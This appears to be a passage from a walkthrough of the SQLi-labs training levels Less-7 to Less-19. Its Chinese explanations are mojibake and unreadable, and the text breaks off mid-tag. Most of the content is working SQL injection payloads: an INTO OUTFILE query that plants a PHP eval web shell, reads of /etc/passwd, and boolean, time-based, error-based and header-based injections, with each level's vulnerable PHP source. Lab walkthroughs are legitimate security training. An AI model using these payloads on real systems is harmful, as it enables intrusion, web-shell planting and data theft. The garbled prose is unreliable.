@@basediræ˜¯æŒ‡Mysqlçš„å®‰è£…ç›®å½•ï¼Œ@@datadiræ˜¯æŒ‡æ•°æ®åº“æ–‡ä»¶çš„è·¯å¾„ï¼Œæˆ‘ä»¬éœ€è¦ç”¨webç›®å½•ï¼Œé»˜è®¤/var/www/html,å› æ­¤æˆ‘ä»¬ 1?id=1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile &quot;/var/www/html/moonback.php&quot;%23 æ³¨æ„è¿™ä¸ªå†™çš„ç›®å½•è¦æœ‰æƒé™ï¼Œå¹¶ä¸”mysqlæœ‰å†™æ–‡ä»¶æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œ 1show variables like &#x27;%secure%&#x27; åœ¨mysql 5.6.34ç‰ˆæœ¬ä»¥å secure_file_privçš„å€¼é»˜è®¤ä¸ºNULLã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ä¿®æ”¹ ä¿®æ”¹mysql.ini æ–‡ä»¶ï¼Œåœ¨[mysqld] ä¸‹æ·»åŠ æ¡ç›®: secure_file_priv = ä¿å­˜ï¼Œé‡å¯mysqlã€‚ 123#å€¼ä¸ºnull ï¼Œä¹Ÿå°±æ˜¯æ³¨é‡Šæ‰è¿™ä¸ªå‚æ•°æˆ–è€…secure-file-priv&#x3D;nullã€‚è¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡º#å€¼ä¸º&#x2F;tmp&#x2F; ï¼Œå³secure-file-priv&#x3D;&quot;&#x2F;tmp&#x2F;&quot; è¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨&#x2F;tmp&#x2F;ç›®å½•ä¸‹#æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œå³secure-file-priv&#x3D; è¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶ è¯»æ–‡ä»¶æˆ‘ä»¬ä¹Ÿå¯ä»¥è¯»æ–‡ä»¶ 123create table user(cmd text);insert into user(cmd) values (load_file(&#x27;/etc/passwd&#x27;));select * from user; ä¹Ÿå¯ä»¥ç”¨ 12load data infile &#x27;/etc/passwd&#x27; into table user;load data local infile &#x27;/etc/passwd&#x27; into table test.test fields terminated by &#x27;\\n&#x27;; å…³é”®ä»£ç 1234567891011121314151617$sql=&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;; echo &#x27;You are in.... Use outfile......&#x27;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;/font&gt;&quot;;&#125;else &#123;echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;echo &#x27;You have an error in your SQL syntax&#x27;;echo &quot;&lt;/font&gt;&quot;; &#125; Less-8é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯boolç›²æ³¨ï¼Œå½“ç„¶ä¹Ÿå¯ç”¨æ—¶é—´ç›²æ³¨ï¼Œèƒ½ç”¨boolå°½é‡ç”¨ï¼Œé€Ÿåº¦æ¯”è¾ƒå¿« 12?id=1&#x27; and if(0,1,0)%23?id=1&#x27; and if(1,1,0)%23 ä¸¤ä¸ªurlè¿”å›çš„ç»“æœä¸ä¸€æ ·ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨ifçš„ç¬¬ä¸€ä¸ªå‚æ•°æ³¨å…¥ å…³é”®ä»£ç 123456789101112$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; echo &#x27;You are in...........&#x27;;&#125;else &#123; echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;; &#125; Less-9é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯æ—¶é—´ç›²æ³¨ 12?id=1&#x27; and if(0,sleep(3),0)%23?id=1&#x27; and if(1,sleep(3),0)%23 å’ŒLess-8å·®ä¸å¤šçš„payloadï¼Œè¿™é¢˜ä¸èƒ½ç”¨boolç›²æ³¨çš„åŸå› æ˜¯ä¸¤ç§è¯·æ±‚è¿”å›çš„ç»“æœä¸€æ ·ï¼Œæ— æ³•æ ¹æ®é¡µé¢å†…å®¹åˆ¤æ–­æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ°å¥½æ»¡è¶³æ¡ä»¶ å…³é”®ä»£ç 1234567891011$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; echo &#x27;You are in...........&#x27;;&#125;else &#123; echo &#x27;You are in...........&#x27;; &#125; Less-10è¿˜æ˜¯æ—¶é—´ç›²æ³¨ï¼Œåªä¸è¿‡éœ€è¦ç”¨&quot;é—­åˆ å…³é”®ä»£ç 12345678910111213141516171819$id = &#x27;&quot;&#x27;.$id.&#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;; echo &#x27;You are in...........&#x27;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;/font&gt;&quot;;&#125;else &#123;echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;echo &#x27;You are in...........&#x27;;echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;; &#125; Less-11POSTæ³¨å…¥ï¼Œå’ŒLess-1å·®ä¸å¤šï¼Œåªæ˜¯æ¥æ”¶å‚æ•°çš„æ–¹å¼ä¸åŒï¼Œorder byåˆ¤æ–­åˆ—æ•° 1POST uname=admin&#x27; order by 2%23&amp;passwd=aaa&amp;submit=Submit é€šè¿‡å“åº”é•¿åº¦çš„ä¸åŒå¯ä»¥åˆ¤æ–­æœ‰ä¸¤åˆ— è”åˆæŸ¥è¯¢ï¼Œå›æ˜¾åœ¨ç™»é™†ä¹‹åç•Œé¢ä¸Š 1POST uname=asdf&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;passwd=aaa&amp;submit=Submit æ¥ç€åˆæ˜¯çˆ†å­—æ®µï¼Œçˆ†å†…å®¹é‚£ç§äº† ä¹Ÿå¯ä»¥æŠ¥é”™æ³¨å…¥ 1POST uname=asdf&#x27; and updatexml(1,concat(0x3a,(select user())),1)%23&amp;passwd=aaa&amp;submit=Submit å…³é”®ä»£ç 1234567891011121314151617181920212223242526272829@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;; echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;;&#125;else &#123; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125; Less-12å’ŒLess-11å·®ä¸å¤šï¼Œé—­åˆæ–¹å¼ä¸åŒè€Œå·²ï¼ŒåŠ ä¸ªå•æˆ–åŒå¼•å·è¯•è¯•ï¼Œä»æŠ¥é”™ä¿¡æ¯å°±èƒ½çŒœå‡ºåå°sqlè¯­å¥ 123uname&#x3D;aaa&quot;&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submitthe right syntax to use near &#39;bbb&quot;) LIMIT 0,1&#39; at line 1 çŒœæµ‹æˆ‘ä»¬åŠ çš„&quot;ä¸å‰é¢çš„é—­åˆï¼Œæœ¬æ¥æœ‰çš„å½±å“åé¢çš„ 1SELECT username, password FROM users WHERE username=(&quot;aaa&quot;&quot;) and password=(&quot;bbb&quot;) LIMIT 0,1 æ‰€ä»¥æ„é€  1uname=aaa&quot;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;passwd=sad&amp;submit=Submit æ¥ç€å°±å’ŒLess-11å·®ä¸å¤šäº† å…³é”®ä»£ç 1234567891011121314151617181920212223242526272829303132$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;;@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &quot;&lt;br&gt;&quot;;echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;;echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;;echo &quot;&lt;br&gt;&quot;;echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];echo &quot;&lt;br&gt;&quot;;echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;/font&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;;echo &quot;&lt;/font&gt;&quot;;&#125;else&#123;echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;;print_r(mysql_error());echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;;echo &quot;&lt;/font&gt;&quot;;&#125; Less-13è¿˜æ˜¯åŠ å•åŒå¼•å·è®©å®ƒæŠ¥é”™ 123uname&#x3D;aaa&#39;&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit the right syntax to use near &#39;bbb&#39;) LIMIT 0,1&#39; at line 1 çŒœæµ‹æˆ‘ä»¬åŠ çš„&#39;ä¸å‰é¢çš„é—­åˆï¼Œæœ¬æ¥æœ‰çš„å½±å“åé¢çš„ 1SELECT username, password FROM users WHERE username=(&#x27;aaa&#x27;&#x27;) and password=(&#x27;bbb&#x27;) LIMIT 0,1 è¿™ä¸ªå¥½åƒæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½æŠ¥é”™å’Œç›²æ³¨ä¸¤ç§äº† å…ˆçœ‹æŠ¥é”™ï¼Œæ„é€  1uname&#x3D;admin&#39;) and updatexml(1,concat(0x3a,(select user())),1)%23&amp;passwd&#x3D;dsa&amp;submit&#x3D;Submit å†çœ‹çœ‹ç›²æ³¨ï¼Œå¯ä»¥ç”¨boolç›²æ³¨,æ ¹æ®é•¿åº¦çš„ä¸åŒåˆ¤æ–­ï¼Œæ„é€  123uname=admin&#x27;) and substr((select database()),1,1)=&#x27;s&#x27;%23&amp;passwd=dsa&amp;submit=Submitæˆ–uname=aaa&#x27;) or substr((select database()),1,1)=&#x27;s&#x27;%23&amp;passwd=bbb&amp;submit=Submit æ³¨æ„å¦‚æœunameç”¨admin,å³è¡¨é‡Œé¢å­˜åœ¨çš„å€¼ä¸­é—´å°±ä¸èƒ½ç”¨orï¼Œåé¢çš„ä¼šä¸æ‰§è¡Œï¼Œå¹¶ä¸”sleep(3)æ‰§è¡Œä¹‹åè¿”å›0 å¦‚æœå‰é¢çš„æ˜¯0ï¼Œæˆ‘ä»¬å†è¯•ä¸‹ ä½†æ˜¯æˆ‘å‘ç°æŠ¥é”™æ³¨å…¥å¥½åƒæ²¡è¿™ä¸ªé™åˆ¶ å…³é”®ä»£ç 12345678910111213141516171819202122232425@$sql=&quot;SELECT username, password FROM users WHERE username=(&#x27;$uname&#x27;) and password=(&#x27;$passwd&#x27;) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &quot;&lt;br&gt;&quot;;echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;;echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;/font&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;;echo &quot;&lt;/font&gt;&quot;;&#125;else&#123;echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;;print_r(mysql_error());echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;;echo &quot;&lt;/font&gt;&quot;;&#125; Less-14åŠ åŒå¼•å·æŠ¥é”™ 123uname&#x3D;aaa&quot;&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submitthe right syntax to use near &#39;bbb&quot; LIMIT 0,1&#39; at line 1 çŒœæµ‹åå°sqlè¯­å¥ 1SELECT username, password FROM users WHERE username=&quot;aaa&quot;&quot; and password=&quot;bbb&quot; LIMIT 0,1 å°è¯•å¯ä»¥æŠ¥é”™æ³¨å…¥ 1uname=aaa&quot; and updatexml(1,concat(0x3a,(select user())),1)%23&amp;passwd=bbb&amp;submit=Submit å°è¯•å¸ƒå°”ç›²æ³¨ 1uname=aaa&quot; or substr((select database()),1,1)=&#x27;s&#x27;%23&amp;passwd=bbb&amp;submit=Submit å…³é”®ä»£ç 123456789101112131415161718192021222324252627$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;;@$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &quot;&lt;br&gt;&quot;;echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;;echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;/font&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;;echo &quot;&lt;/font&gt;&quot;;&#125;else&#123;echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;;print_r(mysql_error());echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;;echo &quot;&lt;/font&gt;&quot;;&#125; Less-15æ²¡æœ‰å›æ˜¾ï¼Œè€ƒè™‘ç›²æ³¨å’ŒæŠ¥é”™ å¸ƒå°”ç›²æ³¨ 1uname&#x3D;aaa&#39; or substr((select database()),1,1)&#x3D;&#39;s&#39;%23&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit ä¹Ÿå¯ä»¥æ—¶é—´ç›²æ³¨ 1uname&#x3D;asa&#39; or if((substr((select database()),1,1))&#x3D;&#39;s&#39;,sleep(3),0)%23&amp;passwd&#x3D;dsa&amp;submit&#x3D;Submit æŠ¥é”™æ³¨å…¥ç”¨ä¸äº†äº†ï¼Œå‘ç°print_r(mysql_error());åˆ æ‰äº†ï¼Œè¿™æ ·çš„è¯sqlè¯­å¥é”™è¯¯ä¹Ÿçˆ†ä¸æ¥äº† å…³é”®ä»£ç 123456789101112131415161718192021222324252627@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &quot;&lt;br&gt;&quot;;echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;;echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;/font&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;br&gt;&quot;;echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;;echo &quot;&lt;/font&gt;&quot;;&#125;else&#123;echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;;echo &quot;&lt;/font&gt;&quot;;&#125; Less-16sqlé”™è¯¯çˆ†ä¸å‡ºæ¥åªèƒ½fuzzï¼Œæœ€ç»ˆå¾—åˆ° å¸ƒå°”ç›²æ³¨ï¼š 1uname&#x3D;aaa&quot;) or substr((select database()),1,1)&#x3D;&#39;s&#39;%23&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit æ—¶é—´ç›²æ³¨ï¼š 1uname&#x3D;aaa&quot;) or if((substr((select database()),1,1))&#x3D;&#39;s&#39;,sleep(3),0)%23&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit å…³é”®ä»£ç 12345678910111213141516171819202122232425262728293031&lt;ï¼Ÿphp$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;;@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;; echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;;&#125;else&#123; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;;&#125; Less-17æ¥ç€å°±æ˜¯updateæ³¨å…¥äº†ï¼Œå¯¹äºè¿™ç§æ³¨å…¥ï¼Œæœ€å¥½çš„æ–¹æ³•æ„Ÿè§‰å°±æ˜¯æŠ¥é”™æ³¨å…¥äº† çŒœæµ‹åå°sqlè¯­å¥ï¼š 1update users set password=&#x27;$password&#x27; where username=&#x27;$username&#x27; æˆ‘ä»¬ç›´æ¥æŠ¥é”™æ³¨å…¥ï¼š 1uname&#x3D;admin&amp;passwd&#x3D;sadasda&#39; or updatexml(1,concat(0x3a,(select database())),1)%23&amp;submit&#x3D;Submit æ³¨æ„è¿™é‡Œunameè¡¨é‡Œå¿…é¡»æœ‰ï¼Œåé¢çš„updatexmlæ‰ä¼šæ‰§è¡Œ è¿˜å¯ä»¥æ—¶é—´ç›²æ³¨ï¼š 1uname&#x3D;admin&amp;passwd&#x3D;sadasda&#39; or if(substr((select database()),1,1)&#x3D;&#39;s&#39;,sleep(3),0)%23&amp;submit&#x3D;Submit å…³é”®ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);function check_input($value)&#123;if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabledif (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a numberif (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125;else &#123; $value = intval($value); &#125;return $value;&#125;// take the variablesif(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123;//making sure uname is not injectable$uname=check_input($_POST[&#x27;uname&#x27;]);$passwd=$_POST[&#x27;passwd&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;User Name:&#x27;.$uname.&quot;\\n&quot;);fwrite($fp,&#x27;New Password:&#x27;.$passwd.&quot;\\n&quot;);fclose($fp);// connectivity@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; $row1 = $row[&#x27;username&#x27;]; $update=&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;; mysql_query($update); echo &quot;&lt;br&gt;&quot;; if (mysql_error()) &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125; echo &#x27;&lt;img src=&quot;../images/flag1.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;;&#125;else&#123; echo &#x27;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;;&#125;&#125;?&gt; Less-18è¿™ä¸ªæ˜¯User-Agent insertæ³¨å…¥ sqlè¯­å¥ï¼š 1INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname) æŠ¥é”™æ³¨å…¥æ„é€ ï¼š 1User-Agent: firefox&#x27; or updatexml(1,concat(0x3a,(select user())),1) or &#x27; è¿™é‡Œçš„è´¦å·å¯†ç å¿…é¡»æ­£ç¡® ä¹Ÿå¯ä»¥æ—¶é—´ç›²æ³¨ï¼š 1User-Agent: firefox&#x27; or if(substr((select database()),1,1)=&#x27;s&#x27;,sleep(3),0) or &#x27; å…³é”®ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);function check_input($value)&#123;if(!empty($value))&#123;// truncation (see comments)$value = substr($value,0,20);&#125;// Stripslashes if magic quotes enabledif (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125;// Quote if not a numberif (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125;else &#123; $value = intval($value); &#125;return $value;&#125;$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];echo &quot;&lt;br&gt;&quot;;echo &#x27;Your IP ADDRESS is: &#x27; .$IP;echo &quot;&lt;br&gt;&quot;;// take the variablesif(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123;$uname = check_input($_POST[&#x27;uname&#x27;]);$passwd = check_input($_POST[&#x27;passwd&#x27;]);$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;User Agent:&#x27;.$uname.&quot;\\n&quot;);fclose($fp);$sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;$result1 = mysql_query($sql);$row1 = mysql_fetch_array($result1);if($row1) &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;; $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;; mysql_query($insert); echo &quot;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;; echo &#x27;Your User Agent is: &#x27; .$uagent; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; &#125;else &#123; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125;&#125;?&gt; Less-19è¿™ä¸ªæ˜¯Referer insertæ³¨å…¥ï¼Œå’Œä¸Šä¸€å…³æ€è·¯ä¸€æ · sqlè¯­å¥ï¼š 1INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$refer&#x27;, &#x27;$IP&#x27;) æŠ¥é”™æ³¨å…¥æ„é€ ï¼š 1Referer: 1&#x27; or updatexml(1,concat(0x3a,(select user())),1) or &#x27; æ—¶é—´ç›²æ³¨æ„é€ : 1Referer: 1&#x27; or if(substr((select database()),1,1)=&#x27;s&#x27;,sleep(3),0) or &#x27; å…³é”®ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);function check_input($value)&#123;if(!empty($value))&#123;// truncation (see comments)$value = substr($value,0,20);&#125;// Stripslashes if magic quotes enabledif (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125;// Quote if not a numberif (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125;else &#123; $value = intval($value); &#125;return $value;&#125;$uagent = $_SERVER[&#x27;HTTP_REFERER&#x27;];$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];echo &quot;&lt;br&gt;&quot;;echo &#x27;Your IP ADDRESS is: &#x27; .$IP;echo &quot;&lt;br&gt;&quot;;// take the variablesif(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123;$uname = check_input($_POST[&#x27;uname&#x27;]);$passwd = check_input($_POST[&#x27;passwd&#x27;]);//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;Referer:&#x27;.$uname.&quot;\\n&quot;);fclose($fp);$sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;$result1 = mysql_query($sql);$row1 = mysql_fetch_array($result1);if($row1) &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;; $insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;; mysql_query($insert); echo &quot;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;; echo &#x27;Your Referer is: &#x27; .$uagent; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; &#125;else &#123; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img 